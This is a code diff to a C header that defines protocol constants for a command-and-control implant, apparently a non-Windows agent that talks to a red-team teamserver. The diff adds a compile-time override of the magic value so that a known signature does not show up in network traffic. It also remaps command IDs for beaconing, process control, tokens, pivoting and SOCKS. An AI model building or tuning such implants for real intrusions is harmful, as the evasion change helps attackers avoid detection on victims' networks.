@@ -74,7 +74,13 @@
 #endif
 
 /* ── C2 protocol constants (must match Windows Demon + teamserver) ───── */
-#define DEMON_MAGIC_VALUE           0xDEADBEEF
+/* Magic value: override at compile time with -DCONFIG_MAGIC=0x... to
+ * avoid the well-known 0xDEADBEEF signature in network traffic. */
+#ifdef CONFIG_MAGIC
+#  define DEMON_MAGIC_VALUE  CONFIG_MAGIC
+#else
+#  define DEMON_MAGIC_VALUE  0xDEADBEEF
+#endif
 
 /* OS type flags sent during registration so the teamserver knows the OS */
 #define DEMON_OS_WINDOWS            0x01
@@ -82,17 +88,20 @@
 #define DEMON_OS_MACOS              0x03
 
 /* Command IDs — identical to commands.go */
+#define COMMAND_GET_JOB             1    /* periodic beacon: request pending jobs */
 #define COMMAND_SLEEP               11
-#define COMMAND_CHECKIN             99
+#define COMMAND_CHECKIN             99   /* = DEMON_INIT: initial registration only */
 #define COMMAND_FS                  15
-#define COMMAND_PROC                16
-#define COMMAND_PROC_LIST           68
+#define COMMAND_PROC                0x1010  /* process module — matches teamserver */
+#define COMMAND_PROC_LIST           12      /* list processes */
 #define COMMAND_OUTPUT              100
 #define COMMAND_SCREENSHOT          2510
 #define COMMAND_PIVOT               2520
 #define COMMAND_SOCKET              2540
 #define COMMAND_EXIT                92
 #define BEACON_OUTPUT               94
+#define COMMAND_TOKEN               40
+#define COMMAND_CHECKIN_             100  /* alias, avoid redef */
 
 /* FS sub-commands */
 #define DEMON_COMMAND_FS_DIR        1
@@ -108,8 +117,11 @@
 
 /* Process sub-commands */
 #define DEMON_COMMAND_PROC_LIST     1
-#define DEMON_COMMAND_PROC_KILL     4
-#define DEMON_COMMAND_PROC_MEMORY   5
+#define DEMON_COMMAND_PROC_MODULES  2
+#define DEMON_COMMAND_PROC_GREP     3
+#define DEMON_COMMAND_PROC_CREATE   4
+#define DEMON_COMMAND_PROC_MEMORY   6
+#define DEMON_COMMAND_PROC_KILL     7
 
 /* Socket sub-commands */
 #define DEMON_COMMAND_SOCKET_SOCKS5_ADD    1
